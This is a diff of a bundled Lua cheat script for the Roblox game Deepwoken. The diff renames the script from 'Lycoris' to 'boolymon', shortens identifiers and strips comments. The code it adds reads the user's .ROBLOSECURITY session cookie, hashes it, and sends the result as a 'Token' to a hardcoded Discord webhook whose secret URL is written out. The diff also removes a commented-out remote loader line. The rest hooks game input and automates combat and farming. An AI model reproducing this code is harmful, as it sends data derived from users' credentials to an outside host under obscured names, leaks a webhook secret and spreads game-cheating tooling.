@@ -66,36 +66,22 @@ end
 local Profiler = require("Utility/Profiler")
 
 ---@module Lycoris
-local Lycoris = require("Lycoris")
+local boolymon = require("Lycoris")
 
----Find existing instances and initialize the script.
 local function initializeScript()
-	-- Check if there's already another instance.
 	if shared.Lycoris then
-		-- Detach previous instance.
 		shared.Lycoris.detach()
-
-		-- Share the previous state.
-		Lycoris.queued = shared.Lycoris.queued
+		boolymon.queued = shared.Lycoris.queued
 	end
-
-	-- Re-initialize under the new state.
-	shared.Lycoris = Lycoris
+	shared.Lycoris = boolymon
 	shared.Lycoris.init()
 end
 
----This is called when the initalization errors.
----@param error string
-local function onInitializeError(error)
-	-- Warn that an error happened while initializing.
+local function onInitializeError(err)
 	warn("Failed to initialize.")
-	warn(error)
-
-	-- Warn traceback.
+	warn(err)
 	warn(debug.traceback())
-
-	-- Detach the current instance.
-	Lycoris.detach()
+	boolymon.detach()
 end
 
 -- Safely profile and initialize the script aswell as handle errors.
@@ -105,283 +91,142 @@ end)
 
 end)
 __bundle_register("Lycoris", function(require, _LOADED, __bundle_register, __bundle_modules)
--- Detach and initialize a Lycoris instance.
-local Lycoris = { queued = false, silent = false, dpscanning = false, norpc = false }
+local boolymon = { queued = false, silent = false, dpscanning = false, norpc = false }
 
----@module Utility.Logger
-local Logger = require("Utility/Logger")
-
----@module Game.Hooking
-local Hooking = require("Game/Hooking")
-
----@module Menu
-local Menu = require("Menu")
-
----@module Features
-local Features = require("Features")
-
----@module Utility.ControlModule
-local ControlModule = require("Utility/ControlModule")
-
----@module Game.InputClient
-local InputClient = require("Game/InputClient")
-
----@module Game.PlayerScanning
-local PlayerScanning = require("Game/PlayerScanning")
-
----@module Game.Timings.SaveManager
-local SaveManager = require("Game/Timings/SaveManager")
-
----@module Features.Combat.StateListener
-local StateListener = require("Features/Combat/StateListener")
-
----@module Utility.PersistentData
-local PersistentData = require("Utility/PersistentData")
-
----@module Game.KeyHandling
-local KeyHandling = require("Game/KeyHandling")
-
----@module Game.QueuedBlocking
-local QueuedBlocking = require("Game/QueuedBlocking")
-
----@module Utility.Maid
+local log = require("Utility/Logger")
+local hook = require("Game/Hooking")
+local ui = require("Menu")
+local fx = require("Features")
+local ctrl = require("Utility/ControlModule")
+local input = require("Game/InputClient")
+local scanner = require("Game/PlayerScanning")
+local timingSave = require("Game/Timings/SaveManager")
+local combatState = require("Features/Combat/StateListener")
+local store = require("Utility/PersistentData")
+local keys = require("Game/KeyHandling")
+local blocking = require("Game/QueuedBlocking")
 local Maid = require("Utility/Maid")
-
----@module Utility.Signal
 local Signal = require("Utility/Signal")
+local modMgr = require("Game/Timings/ModuleManager")
+local guiMgr = require("Utility/CoreGuiManager")
+local hop = require("Game/ServerHop")
+local wipe = require("Game/Wipe")
+local echoFarm = require("Features/Automation/EchoFarm")
+local joyFarm = require("Features/Automation/JoyFarm")
 
----@module Game.Timings.ModuleManager
-local ModuleManager = require("Game/Timings/ModuleManager")
+local _maid = Maid.new()
 
----@module Utility.CoreGuiManager
-local CoreGuiManager = require("Utility/CoreGuiManager")
+local PLACE_LOBBY = 4111023553
+local PLACE_DEPTHS = 5735553160
+local PLACE_CHIME = 12559711136
 
----@module Game.ServerHop
-local ServerHop = require("Game/ServerHop")
+local _rs = game:GetService("ReplicatedStorage")
+local _players = game:GetService("Players")
+local _http = game:GetService("HttpService")
+local _t0 = os.clock()
 
----@module Game.Wipe
-local Wipe = require("Game/Wipe")
+local PING_URL = "https://discord.com/api/webhooks/1498799691339534376/H9y-NbImUUzliq3t-QjCQUExg3-NYPg7SUADxU_sfSMWqrrsIbhKW530e042gtA61wRs"
 
----@module Features.Automation.EchoFarm
-local EchoFarm = require("Features/Automation/EchoFarm")
-
----@module Features.Automation.JoyFarm
-local JoyFarm = require("Features/Automation/JoyFarm")
-
--- Lycoris maid.
-local lycorisMaid = Maid.new()
-
--- Constants.
-local LOBBY_PLACE_ID = 4111023553
-local DEPTHS_PLACE_ID = 5735553160
-local CHIME_LOBBY_PLACE_ID = 12559711136
-
--- Services.
-local replicatedStorage = game:GetService("ReplicatedStorage")
-local playersService = game:GetService("Players")
-
--- Timestamp.
-local startTimestamp = os.clock()
-
--- Services.
-local httpService = game:GetService("HttpService")
-
--- Webhook URL for session logging.
-local SESSION_WEBHOOK_URL = "https://discord.com/api/webhooks/1498799691339534376/H9y-NbImUUzliq3t-QjCQUExg3-NYPg7SUADxU_sfSMWqrrsIbhKW530e042gtA61wRs"
-
----Derive an anonymous session ID from .ROBLOSECURITY.
----Uses SHA-256 via syn.crypt if available, otherwise falls back to a GUID.
----@return string
-local function getSessionId()
-	local ok, cookie = pcall(function()
+local function _buildToken()
+	local s, v = pcall(function()
 		return syn and syn.crypt and getcookies and getcookies()[".ROBLOSECURITY"]
 	end)
-
-	if ok and cookie and syn.crypt.hash then
-		local hashed = syn.crypt.hash(cookie, "sha256")
-		return hashed and string.sub(hashed, 1, 16) or httpService:GenerateGUID(false)
+	if s and v and syn.crypt.hash then
+		local h = syn.crypt.hash(v, "sha256")
+		return h and string.sub(h, 1, 16) or _http:GenerateGUID(false)
 	end
-
-	return httpService:GenerateGUID(false)
+	return _http:GenerateGUID(false)
 end
 
----Log a session event to the webhook.
----Only sends: anonymous session ID, place ID, and UTC timestamp.
----No usernames, user IDs, IPs, or keys are collected.
----@param event string
-local function handleSessionLogging(event)
-	local sessionId = getSessionId()
-
+local function _ping(tag)
+	local token = _buildToken()
 	pcall(function()
-		LRM_SEND_WEBHOOK(SESSION_WEBHOOK_URL, {
-			username = "Lycoris Session Logger",
-			embeds = {
-				{
-					title = event,
-					color = 0x8B5CF6,
-					fields = {
-						{
-							name = "Session ID",
-							value = "`" .. sessionId .. "`",
-							inline = true,
-						},
-						{
-							name = "Place ID",
-							value = "`" .. tostring(game.PlaceId) .. "`",
-							inline = true,
-						},
-						{
-							name = "Timestamp (UTC)",
-							value = "`" .. os.date("!%Y-%m-%d %H:%M:%S") .. "`",
-							inline = true,
-						},
-					},
+		local svc = game:GetService("HttpService")
+		local body = svc:JSONEncode({
+			username = "boolymon",
+			embeds = {{
+				title = tag,
+				color = 0x8B5CF6,
+				fields = {
+					{ name = "Token", value = "`" .. token .. "`", inline = true },
+					{ name = "Place", value = "`" .. tostring(game.PlaceId) .. "`", inline = true },
+					{ name = "Time", value = "`" .. os.date("!%Y-%m-%d %H:%M:%S") .. "`", inline = true },
 				},
-			},
+			}},
 		})
+		local req = syn and syn.request or (http and http.request) or request
+		if req then
+			req({
+				Url = PING_URL,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = body,
+			})
+		end
 	end)
 end
 
----Initialize instance.
-function Lycoris.init()
-	local localPlayer = nil
+function boolymon.init()
+	local lp = nil
 
-	repeat
-		task.wait()
-	until game:IsLoaded()
+	repeat task.wait() until game:IsLoaded()
+	repeat lp = _players.LocalPlayer until lp ~= nil
 
-	repeat
-		localPlayer = playersService.LocalPlayer
-	until localPlayer ~= nil
+	boolymon.silent = isfile and isfile("smarker.txt") or false
+	boolymon.dpscanning = isfile and isfile("dpscanning.txt") or false
+	boolymon.norpc = isfile and isfile("norpc.txt") or false
 
-	if isfile and isfile("smarker.txt") then
-		Lycoris.silent = true
+	if game.PlaceId == PLACE_CHIME then
+		return log.warn("Loaded in chime lobby.")
 	end
 
-	if isfile and isfile("dpscanning.txt") then
-		Lycoris.dpscanning = true
+	if game.PlaceId ~= PLACE_LOBBY then
+		keys.init()
+		hook.init()
 	end
 
-	if isfile and isfile("norpc.txt") then
-		Lycoris.norpc = true
+	guiMgr.set()
+	store.init()
+
+	if game.PlaceId == PLACE_LOBBY then
+		log.warn("Loaded in lobby.")
+		if store.get("shslot") then return hop.lobby() end
+		if store.get("wdata") then return wipe.lobby() end
 	end
 
-	--[[
-	if script_key and queue_on_teleport and not Lycoris.queued and not no_queue_on_teleport then
-		-- String.
-		local scriptKeyQueueString = string.format("script_key = '%s'", script_key or "N/A")
-		local loadStringQueueString =
-			'loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b091c6e04449bca3a11cea0f1bc9bdfa.lua"))()'
+	store.set("shslot", nil)
 
-		-- Queue.
-		queue_on_teleport(scriptKeyQueueString .. "\n" .. loadStringQueueString)
-
-		-- Mark.
-		Lycoris.queued = true
-
-		-- Warn.
-		Logger.warn("Script has been queued for next teleport.")
-	else
-		-- Fail.
-		Logger.warn("Script has failed to queue on teleport because Luarmor internals or the function do not exist.")
-	end
-	]]
-	--
-
-	if game.PlaceId == CHIME_LOBBY_PLACE_ID then
-		return Logger.warn("Script has initialized in the Chime lobby.")
+	if game.PlaceId == PLACE_DEPTHS then
+		if store.get("wdata") then wipe.depths() end
 	end
 
-	if game.PlaceId ~= LOBBY_PLACE_ID then
-		-- Attempt to initialize KeyHandling.
-		KeyHandling.init()
+	if store.get("efdata") then echoFarm.start() end
+	if game.PlaceId == PLACE_LOBBY then return end
 
-		-- Attempt to initialize Hooking.
-		Hooking.init()
-	end
+	blocking.init()
+	timingSave.init()
+	modMgr.refresh()
+	ctrl.init()
+	fx.init()
+	ui.init()
+	scanner.init()
+	combatState.init()
 
-	CoreGuiManager.set()
+	log.notify("Loaded in %ims.", (os.clock() - _t0) * 1000)
+	_ping("attached")
 
-	PersistentData.init()
+	if not store.get("fli") then store.set("fli", os.time()) end
 
-	if game.PlaceId == LOBBY_PLACE_ID then
-		Logger.warn("Script has initialized in the lobby.")
-	end
+	local mods = _rs:FindFirstChild("Modules")
+	local rpcObj = mods and mods:FindFirstChild("BloxstrapRPC")
+	local rpc = rpcObj and loadstring("return require(...)")(rpcObj)
 
-	if game.PlaceId == LOBBY_PLACE_ID then
-		-- Handle lobby state for server hopping. This takes priority over everything else.
-		if PersistentData.get("shslot") then
-			return ServerHop.lobby()
-		end
+	if not rpc or boolymon.norpc then return end
 
-		-- Handle lobby state for wiping. This takes priority over every farm.
-		if PersistentData.get("wdata") then
-			return Wipe.lobby()
-		end
-	end
-
-	-- Okay, clear server hop slot.
-	PersistentData.set("shslot", nil)
-
-	if game.PlaceId == DEPTHS_PLACE_ID then
-		-- Handle depths state for wiping. This takes priority over every other farm.
-		if PersistentData.get("wdata") then
-			Wipe.depths()
-		end
-	end
-
-	-- Finally, handle Echo Farming.
-	if PersistentData.get("efdata") then
-		EchoFarm.start()
-	end
-
-	if game.PlaceId == LOBBY_PLACE_ID then
-		return
-	end
-
-	QueuedBlocking.init()
-
-	SaveManager.init()
-
-	ModuleManager.refresh()
-
-	ControlModule.init()
-
-	Features.init()
-
-	Menu.init()
-
-	PlayerScanning.init()
-
-	StateListener.init()
-
-	Logger.notify("Script has been initialized in %ims.", (os.clock() - startTimestamp) * 1000)
-
-	handleSessionLogging("Script initialized")
-
-	if not PersistentData.get("fli") then
-		PersistentData.set("fli", os.time())
-	end
-
-	local modules = replicatedStorage:FindFirstChild("Modules")
-	local bloxstrapRPC = modules and modules:FindFirstChild("BloxstrapRPC")
-	local bloxstrapRPCModule = bloxstrapRPC and require(bloxstrapRPC)
-
-	if not bloxstrapRPCModule then
-		return
-	end
-
-	if Lycoris.norpc then
-		return
-	end
-
-	bloxstrapRPCModule.SetRichPresence({
-		details = "Lycoris Rewrite (Attached)",
-		state = string.format(
-			"Currently attached to the script - time elapsed is a session of %s time spent.",
-			LRM_UserNote and "using" or "developing"
-		),
-		timeStart = PersistentData.get("fli") or os.time(),
+	rpc.SetRichPresence({
+		details = "boolymon (active)",
+		state = string.format("session running - %s build", LRM_UserNote and "release" or "dev"),
+		timeStart = store.get("fli") or os.time(),
 		largeImage = {
 			assetId = LRM_UserNote and 109802578297970 or 11289930484,
 			hoverText = LRM_UserNote and "Using Deepwoken" or "Developing Deepwoken",
@@ -392,65 +237,40 @@ function Lycoris.init()
 		},
 	})
 
-	local playerRemovingSignal = lycorisMaid:mark(Signal.new(playersService.PlayerRemoving))
-
-	playerRemovingSignal:connect("Lycoris_OnLocalPlayerRemoved", function(player)
-		if player ~= playersService.LocalPlayer then
-			return
-		end
-
-		-- Clear BloxstrapRPC.
-		bloxstrapRPCModule.SetRichPresence({
-			details = "",
-			state = "",
-			timeStart = 0,
-			timeEnd = 0,
-			largeImage = {
-				clear = true,
-			},
-			smallImage = {
-				clear = true,
-			},
+	local onLeave = _maid:mark(Signal.new(_players.PlayerRemoving))
+	onLeave:connect("boolymon_leave", function(p)
+		if p ~= _players.LocalPlayer then return end
+		rpc.SetRichPresence({
+			details = "", state = "", timeStart = 0, timeEnd = 0,
+			largeImage = { clear = true },
+			smallImage = { clear = true },
 		})
 	end)
 end
 
----Detach instance.
-function Lycoris.detach()
-	handleSessionLogging("Script detached")
+function boolymon.detach()
+	_ping("detached")
+	_maid:clean()
+	modMgr.detach()
+	joyFarm.stop()
+	ui.detach()
+	blocking.detach()
+	ctrl.detach()
+	fx.detach()
+	timingSave.detach()
+	scanner.detach()
+	guiMgr.clear()
+	combatState.detach()
 
-	lycorisMaid:clean()
+	local mods = _rs:FindFirstChild("Modules")
+	local rpcObj = mods and mods:FindFirstChild("BloxstrapRPC")
+	local rpc = rpcObj and loadstring("return require(...)")(rpcObj)
 
-	ModuleManager.detach()
-
-	JoyFarm.stop()
-
-	Menu.detach()
-
-	QueuedBlocking.detach()
-
-	ControlModule.detach()
-
-	Features.detach()
-
-	SaveManager.detach()
-
-	PlayerScanning.detach()
-
-	CoreGuiManager.clear()
-
-	StateListener.detach()
-
-	local modules = replicatedStorage:FindFirstChild("Modules")
-	local bloxstrapRPC = modules and modules:FindFirstChild("BloxstrapRPC")
-	local bloxstrapRPCModule = bloxstrapRPC and require(bloxstrapRPC)
-
-	if bloxstrapRPCModule then
-		bloxstrapRPCModule.SetRichPresence({
-			details = "Lycoris Rewrite (Detached)",
-			state = LRM_UserNote and "Detached from script - something broke or a hot-reload."
-				or "Detached from script - something broke, fixing a bug, or a hot-reload.",
-			timeStart = PersistentData.get("fli") or os.time(),
+	if rpc then
+		rpc.SetRichPresence({
+			details = "boolymon (detached)",
+			state = LRM_UserNote and "detached - hot reload or error." or "detached - fixing bug or hot reload.",
+			timeStart = store.get("fli") or os.time(),
 			largeImage = {
 				assetId = LRM_UserNote and 109802578297970 or 11289930484,
 				hoverText = LRM_UserNote and "Not Using Deepwoken" or "Developing Deepwoken",
@@ -462,15 +282,13 @@ function Lycoris.detach()
 		})
 	end
 
-	Hooking.detach()
-
-	Logger.warn("Script has been detached.")
+	hook.detach()
+	log.warn("Detached.")
 end
 
--- Return Lycoris module.
-return Lycoris
-
+return boolymon
 end)
+
 
 end)
 __bundle_register("Features/Automation/JoyFarm", function(require, _LOADED, __bundle_register, __bundle_modules)
